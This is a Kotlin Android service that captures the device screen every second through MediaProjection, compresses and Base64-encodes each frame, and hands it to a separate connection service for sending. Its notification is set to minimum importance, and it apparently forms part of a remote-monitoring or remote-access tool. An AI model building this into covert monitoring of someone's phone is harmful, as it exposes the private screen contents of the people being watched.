package com.example.admin

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import java.io.ByteArrayOutputStream

class ScreenCaptureService : Service() {

    companion object {
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        private const val NOTIF_ID = 1002
        private const val INTERVAL_MS = 1000L // 1 second
    }

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())
    private var running = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(NotificationChannel("screen", "Screen", NotificationManager.IMPORTANCE_MIN))
        
        val notif = Notification.Builder(this, "screen")
            .setContentTitle("Screen Mirroring")
            .setSmallIcon(android.R.drawable.stat_sys_warning)
            .build()
            
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val rc = intent?.getIntExtra(EXTRA_RESULT_CODE, -1) ?: -1
        @Suppress("DEPRECATION")
        val data = intent?.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)
        if (rc == -1 || data == null) {
            stopSelf()
            return START_NOT_STICKY
        }
        if (!running) startCapture(rc, data)
        return START_STICKY
    }

    private fun startCapture(resultCode: Int, data: Intent) {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            projection = mpm.getMediaProjection(resultCode, data)
            projection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() { stopSelf() }
            }, handler)

            // DOWNGRADE TO 480P TO SAVE BANDWIDTH
            val targetW = 480
            val targetH = 800 
            imageReader = ImageReader.newInstance(targetW, targetH, PixelFormat.RGBA_8888, 2)

            virtualDisplay = projection?.createVirtualDisplay(
                "screen-capture",
                targetW, targetH, resources.displayMetrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface, null, handler
            )

            running = true
            scheduleFrame()
        } catch (e: Exception) {
            stopSelf()
        }
    }

    private fun scheduleFrame() {
        if (!running) return
        handler.postDelayed({
            captureOnce()
            scheduleFrame()
        }, INTERVAL_MS)
    }

    private fun captureOnce() {
        val reader = imageReader ?: return
        val img = try { reader.acquireLatestImage() } catch (_: Exception) { null }
        if (img != null) {
            try {
                val plane = img.planes[0]
                val w = img.width
                val h = img.height
                val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
                bmp.copyPixelsFromBuffer(plane.buffer)
                val baos = ByteArrayOutputStream()
                // COMPRESS TO 20% QUALITY
                bmp.compress(Bitmap.CompressFormat.JPEG, 20, baos) 
                bmp.recycle()
                val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                ConnectionService.push(applicationContext, "screen_frame", b64)
            } catch (_: Exception) {
            } finally {
                try { img.close() } catch (_: Exception) {}
            }
        }
    }

    override fun onDestroy() {
        running = false
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { projection?.stop() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        super.onDestroy()
    }
}
